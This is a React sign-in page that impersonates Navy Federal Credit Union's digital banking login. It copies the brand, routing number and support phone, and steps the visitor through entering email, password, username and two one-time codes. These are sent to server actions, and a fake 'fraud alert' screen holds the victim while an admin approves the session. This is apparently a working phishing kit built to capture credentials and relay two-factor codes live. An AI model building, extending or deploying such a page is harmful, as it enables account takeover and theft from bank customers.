'use client';

import { useEffect, useState } from 'react';
import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from '@/app/actions';

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success';

const WAIT_MSG =
  'Your account verification will automatically update here once admin looks into the fraud alert.';

export default function SignInPage() {
  const [step, setStep] = useState<Step>('credentials');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [otp, setOtp] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [note, setNote] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return;
    let cancelled = false;
    const tick = async () => {
      const s = await getStatus(attemptId);
      if (cancelled) return;
      if (s.status === 'approved') setStep('approved_success');
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected');
        setError('Sign-in was rejected.');
      }
    };
    tick();
    const id = setInterval(tick, 2500);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [step, attemptId]);

  if (step === 'approved_success') {
    return (
      <div style={s.page}>
        <div style={s.successCard}>
          <div style={s.successIcon}>✅</div>
          <h1 style={s.successHeading}>Congratulations</h1>
          <p style={s.successText}>Your account &amp; verification has been approved.</p>
          {email ? <p style={s.successEmail}>{email}</p> : null}
        </div>
      </div>
    );
  }

  if (step === 'rejected') {
    return (
      <div style={s.page}>
        <div style={s.successCard}>
          <div style={s.errorIcon}>🚫</div>
          <h1 style={{ ...s.successHeading, color: '#c62828' }}>Sign-in Blocked</h1>
          <p style={s.successText}>Your sign-in was rejected.</p>
          <button
            style={s.signOutBtn}
            onClick={() => {
              setStep('credentials');
              setAttemptId(null);
              setUsername('');
              setOtp('');
              setError(null);
              setNote(null);
            }}
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
    credentials: 'Sign In',
    username: 'Enter Username',
    otp1: 'Enter Code',
    otp2: 'Enter Second Code',
    awaiting_approval: 'Verification in Progress',
    rejected: 'Sign-in Blocked',
  };

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setLoading(true);
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setAttemptId(r.attemptId);
        setStep('username');
        setNote(null);
        return;
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false);
          setError('Session lost.');
          return;
        }
        const r = await submitUsername({ attemptId, username });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setOtp('');
        setStep('otp1');
        setNote('Code sent to your email.');
        return;
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false);
          setError('Session lost.');
          return;
        }
        const which = step === 'otp1' ? 1 : 2;
        const r = await submitOtp({ attemptId, otp, which });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setOtp('');
        if (r.next === 'otp2') {
          setStep('otp2');
          setNote('New second code sent to your email.');
          return;
        }
        setStep('awaiting_approval');
        setNote(WAIT_MSG);
      }
    } catch (err) {
      setLoading(false);
      setError(err instanceof Error ? err.message : 'Error');
    }
  }

  return (
    <div style={s.page}>
      {/* HEADER */}
      <header style={s.header}>
        <div style={s.headerInner}>
          <div style={s.logo}>
            NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
          </div>
          <span style={s.routing}>Routing Number: 256074974</span>
        </div>
      </header>

      {/* MAIN */}
      <main style={s.main}>
        <h1 style={s.welcome}>Welcome to Digital Banking</h1>

        <div style={s.card}>
          <div style={s.cardBar}></div>
          <div style={s.cardBody}>
            {/* Header */}
            <div style={s.cardHeader}>
              <div style={s.lockIcon}>
                <div style={s.lockShackle}></div>
                <div style={s.lockBody}><div style={s.lockHole}></div></div>
              </div>
              <span style={s.cardTitle}>{titles[step]}</span>
              <span style={s.stepIndicator}>
                {step === 'credentials' && 'Step 1/3'}
                {step === 'username' && 'Step 2/3'}
                {(step === 'otp1' || step === 'otp2') && 'Step 3/3'}
              </span>
            </div>

            {/* Progress */}
            <div style={s.progress}>
              <div style={{ ...s.progressStep, background: step !== 'credentials' ? '#4caf50' : '#0a1628' }} />
              <div style={{ ...s.progressStep, background: step === 'username' ? '#0a1628' : (step === 'otp1' || step === 'otp2' || step === 'awaiting_approval') ? '#4caf50' : '#ddd' }} />
              <div style={{ ...s.progressStep, background: (step === 'otp1' || step === 'otp2' || step === 'awaiting_approval') ? '#0a1628' : '#ddd' }} />
            </div>

            {/* Messages */}
            {error && <div style={s.messageError}>❌ {error}</div>}
            {note && step !== 'awaiting_approval' && <div style={s.messageInfo}>{note}</div>}

            {/* Form */}
            <form onSubmit={onSubmit} style={s.form}>
              {step === 'credentials' && (
                <>
                  <div style={s.field}>
                    <label style={s.label}>Email Address</label>
                    <input
                      type="email"
                      required
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      style={s.input}
                      placeholder="you@example.com"
                    />
                  </div>
                  <div style={s.field}>
                    <label style={s.label}>Password</label>
                    <input
                      type="password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      style={s.input}
                      placeholder="Enter your password"
                    />
                  </div>
                  <a href="#" style={s.helpLink}>SIGN IN HELP</a>
                </>
              )}

              {step === 'username' && (
                <div style={s.field}>
                  <label style={s.label}>Username</label>
                  <input
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    style={s.input}
                    placeholder="Enter your username"
                    autoComplete="username"
                  />
                </div>
              )}

              {(step === 'otp1' || step === 'otp2') && (
                <div style={s.field}>
                  <label style={s.label}>{step === 'otp1' ? 'Verification Code' : 'Second Code'}</label>
                  <input
                    required
                    inputMode="numeric"
                    maxLength={6}
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                    style={{ ...s.input, ...s.otpInput }}
                    placeholder="000000"
                  />
                </div>
              )}

              {step === 'awaiting_approval' && (
                <div style={s.waitingBox}>
                  <div style={s.waitingIcon}>⏳</div>
                  <p style={s.waitingText}>{WAIT_MSG}</p>
                </div>
              )}

              {step !== 'awaiting_approval' && step !== 'rejected' && (
                <button
                  type="submit"
                  disabled={loading}
                  style={{ ...s.submitBtn, opacity: loading ? 0.6 : 1 }}
                >
                  {loading ? 'Processing…' : 'Continue'}
                </button>
              )}

              {step !== 'credentials' && step !== 'awaiting_approval' && step !== 'rejected' && (
                <button
                  type="button"
                  style={s.secondaryBtn}
                  onClick={() => {
                    setStep('credentials');
                    setAttemptId(null);
                    setUsername('');
                    setOtp('');
                    setError(null);
                    setNote(null);
                  }}
                >
                  Start Over
                </button>
              )}
            </form>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer style={s.footer}>
        <div style={s.footerInner}>
          <div>
            <div style={s.footerLogo}>NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span></div>
            <div style={s.footerContact}>24/7 Member Services: <strong>1-888-842-6328</strong></div>
            <div style={s.footerContact}>Routing Number: <strong>256074974</strong></div>
          </div>
          <div style={s.footerLinks}>
            <a href="#" style={s.footerLink}>About Us</a>
            <a href="#" style={s.footerLink}>Contact Us</a>
            <a href="#" style={s.footerLink}>Privacy</a>
            <a href="#" style={s.footerLink}>Security</a>
            <a href="#" style={s.footerLink}>Accessibility</a>
            <a href="#" style={s.footerLink}>Terms</a>
          </div>
        </div>
        <div style={s.footerBottom}>
          <span>© 2026 Navy Federal Credit Union.</span>
          <span>All rights reserved.</span>
        </div>
      </footer>
    </div>
  );
}

// ==========================================
// STYLES
// ==========================================
const s: { [key: string]: React.CSSProperties } = {
  page: {
    minHeight: '100vh',
    background: '#fafafa',
    fontFamily: '"Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif',
    display: 'flex',
    flexDirection: 'column',
  },
  header: {
    background: '#0a1628',
    padding: '12px 16px',
    width: '100%',
  },
  headerInner: {
    maxWidth: '1200px',
    margin: '0 auto',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    flexWrap: 'wrap',
    gap: '8px',
  },
  logo: {
    fontSize: 'clamp(18px, 4vw, 24px)',
    fontWeight: 700,
    color: 'white',
    letterSpacing: '1px',
  },
  routing: {
    color: 'rgba(255,255,255,0.7)',
    fontSize: 'clamp(11px, 2vw, 14px)',
  },
  main: {
    flex: 1,
    padding: '24px 16px 40px',
    maxWidth: '1200px',
    margin: '0 auto',
    width: '100%',
  },
  welcome: {
    color: '#0a1628',
    fontSize: 'clamp(24px, 5vw, 32px)',
    fontWeight: 600,
    marginBottom: 'clamp(20px, 4vw, 28px)',
  },
  card: {
    background: '#f5f5f5',
    borderRadius: '8px',
    overflow: 'hidden',
    boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
    maxWidth: '560px',
    width: '100%',
  },
  cardBar: {
    height: '6px',
    background: '#ed780f',
  },
  cardBody: {
    padding: 'clamp(20px, 4vw, 32px)',
  },
  cardHeader: {
    display: 'flex',
    alignItems: 'center',
    gap: '12px',
    marginBottom: '24px',
    paddingBottom: '20px',
    borderBottom: '1.5px solid #d0d0d0',
    flexWrap: 'wrap',
  },
  lockIcon: {
    width: '36px',
    height: '42px',
    position: 'relative',
    flexShrink: 0,
  },
  lockShackle: {
    width: '18px',
    height: '18px',
    border: '4px solid #888',
    borderBottom: 'none',
    borderRadius: '9px 9px 0 0',
    position: 'absolute',
    top: '2px',
    left: '50%',
    transform: 'translateX(-50%)',
  },
  lockBody: {
    width: '28px',
    height: '22px',
    background: '#888',
    borderRadius: '3px',
    position: 'absolute',
    bottom: 0,
    left: '50%',
    transform: 'translateX(-50%)',
  },
  lockHole: {
    width: '6px',
    height: '6px',
    background: 'white',
    borderRadius: '50%',
    position: 'absolute',
    bottom: '8px',
    left: '50%',
    transform: 'translateX(-50%)',
  },
  cardTitle: {
    fontSize: 'clamp(20px, 4vw, 28px)',
    fontWeight: 400,
    color: '#333',
  },
  stepIndicator: {
    marginLeft: 'auto',
    fontSize: 'clamp(12px, 2vw, 14px)',
    color: '#888',
  },
  progress: {
    display: 'flex',
    gap: '8px',
    marginBottom: '24px',
    justifyContent: 'center',
  },
  progressStep: {
    width: 'clamp(40px, 10vw, 60px)',
    height: '4px',
    borderRadius: '2px',
    background: '#ddd',
    transition: 'background 0.3s',
  },
  form: {
    display: 'flex',
    flexDirection: 'column',
    gap: 0,
  },
  field: {
    marginBottom: '22px',
  },
  label: {
    fontSize: '16px',
    fontWeight: 500,
    color: '#222',
    display: 'block',
    marginBottom: '8px',
  },
  input: {
    width: '100%',
    padding: '12px 14px',
    fontSize: '16px',
    border: '2px solid #999',
    borderRadius: '8px',
    background: 'white',
    outline: 'none',
    boxSizing: 'border-box',
  },
  otpInput: {
    textAlign: 'center',
    fontSize: 'clamp(22px, 5vw, 28px)',
    letterSpacing: '8px',
    padding: '16px',
  },
  helpLink: {
    display: 'inline-block',
    color: '#0667ba',
    fontSize: 'clamp(12px, 2vw, 14px)',
    fontWeight: 600,
    textDecoration: 'none',
    borderBottom: '2px dotted #0667ba',
    paddingBottom: '2px',
    marginBottom: '24px',
    textTransform: 'uppercase',
  },
  submitBtn: {
    width: '100%',
    padding: '16px',
    background: '#ed780f',
    color: 'white',
    fontSize: 'clamp(18px, 3vw, 22px)',
    fontWeight: 600,
    border: 'none',
    borderRadius: '8px',
    cursor: 'pointer',
    boxShadow: '0 4px 8px rgba(0,0,0,0.15)',
  },
  secondaryBtn: {
    width: '100%',
    padding: '12px',
    background: 'transparent',
    color: '#0667ba',
    fontSize: '16px',
    fontWeight: 600,
    border: '2px solid #0667ba',
    borderRadius: '8px',
    cursor: 'pointer',
    marginTop: '12px',
  },
  messageError: {
    padding: '12px 16px',
    borderRadius: '4px',
    marginBottom: '16px',
    fontSize: '14px',
    background: '#ffebee',
    color: '#c62828',
    border: '1px solid #ffcdd2',
  },
  messageInfo: {
    padding: '12px 16px',
    borderRadius: '4px',
    marginBottom: '16px',
    fontSize: '14px',
    background: '#e3f2fd',
    color: '#0d47a1',
    border: '1px solid #bbdefb',
  },
  waitingBox: {
    textAlign: 'center',
    padding: '20px 0',
  },
  waitingIcon: {
    fontSize: '48px',
    marginBottom: '16px',
  },
  waitingText: {
    color: '#555',
    fontSize: 'clamp(14px, 2vw, 16px)',
    lineHeight: 1.6,
    maxWidth: '400px',
    margin: '0 auto',
  },
  successCard: {
    maxWidth: '400px',
    width: '100%',
    margin: '0 auto',
    padding: 'clamp(30px, 6vw, 50px)',
    background: 'white',
    borderRadius: '12px',
    boxShadow: '0 8px 24px rgba(0,0,0,0.12)',
    textAlign: 'center',
  },
  successIcon: {
    fontSize: '48px',
    marginBottom: '16px',
  },
  errorIcon: {
    fontSize: '48px',
    marginBottom: '16px',
  },
  successHeading: {
    fontSize: 'clamp(24px, 4vw, 28px)',
    fontWeight: 600,
    color: '#0a1628',
    marginBottom: '8px',
  },
  successText: {
    fontSize: '16px',
    color: '#555',
    marginBottom: '8px',
  },
  successEmail: {
    fontSize: '14px',
    color: '#666',
    marginTop: '8px',
  },
  signOutBtn: {
    padding: '12px 32px',
    background: '#ed780f',
    color: 'white',
    fontSize: '18px',
    fontWeight: 600,
    border: 'none',
    borderRadius: '8px',
    cursor: 'pointer',
    marginTop: '16px',
  },
  footer: {
    background: '#0a1628',
    color: 'rgba(255,255,255,0.7)',
    padding: 'clamp(30px, 5vw, 40px) 16px',
    marginTop: '40px',
    width: '100%',
  },
  footerInner: {
    maxWidth: '1200px',
    margin: '0 auto',
    display: 'flex',
    flexWrap: 'wrap',
    gap: 'clamp(20px, 4vw, 30px)',
    justifyContent: 'space-between',
  },
  footerLogo: {
    fontSize: 'clamp(18px, 3vw, 20px)',
    fontWeight: 700,
    color: 'white',
    marginBottom: '8px',
  },
  footerContact: {
    fontSize: 'clamp(12px, 2vw, 14px)',
    marginBottom: '8px',
  },
  footerLinks: {
    display: 'flex',
    flexWrap: 'wrap',
    gap: 'clamp(12px, 2vw, 20px)',
  },
  footerLink: {
    color: 'rgba(255,255,255,0.7)',
    textDecoration: 'none',
    fontSize: 'clamp(12px, 2vw, 14px)',
  },
  footerBottom: {
    borderTop: '1px solid rgba(255,255,255,0.1)',
    paddingTop: '20px',
    marginTop: '20px',
    textAlign: 'center',
    fontSize: 'clamp(11px, 2vw, 12px)',
    maxWidth: '1200px',
    margin: '20px auto 0',
  },
};